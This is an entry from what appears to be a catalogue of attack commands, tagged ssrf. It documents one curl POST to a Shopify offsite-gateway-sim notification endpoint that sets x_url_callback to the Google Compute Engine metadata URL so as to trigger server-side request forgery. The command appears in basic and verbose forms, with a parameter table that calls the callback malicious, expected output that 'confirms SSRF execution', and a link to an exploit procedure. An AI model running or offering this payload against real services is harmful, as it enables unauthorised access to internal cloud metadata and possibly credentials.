---
id: cmd-uuid-001
data: >-
  curl -X POST https://offsite-gateway-sim.shopifycloud.com/notification -H
  "Content-Type: application/json" -d '{"x_url_callback":
  "http://metadata/computeMetadata/v1beta1/"}'
tags:
  - ssrf
  - http
  - post
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.977Z'
verified: false
validated: true
submitted: true
---
# curl-post-notification-with-metadata-callback

## Command

```bash
curl -X POST https://offsite-gateway-sim.shopifycloud.com/notification \
  -H "Content-Type: application/json" \
  -d '{"x_url_callback": "http://metadata/computeMetadata/v1beta1/"}'
```

## Description

This command performs a POST request to the Shopify offsite-gateway-sim notification endpoint, setting the x_url_callback parameter to the Google Compute Engine metadata URL, triggering an SSRF to fetch internal metadata and observe the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://offsite-gateway-sim.shopifycloud.com/notification` | Target endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d '{"x_url_callback": "http://metadata/computeMetadata/v1beta1/"}'` | JSON data with malicious callback URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://offsite-gateway-sim.shopifycloud.com/notification -H "Content-Type: application/json" -d '{"x_url_callback": "http://metadata/computeMetadata/v1beta1/"}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST https://offsite-gateway-sim.shopifycloud.com/notification -H "Content-Type: application/json" -d '{"x_url_callback": "http://metadata/computeMetadata/v1beta1/"}'
```

## Expected Output

A JSON or text response from the server, potentially including error details like {"error": "403 Forbidden: Missing Metadata-Flavor header"} or indications of blocked internal access, confirming SSRF execution.

## Related

- [[Related Procedure: Exploit-SSRF-via-Callback-URL-in-Payment-Notification-Endpoint]]
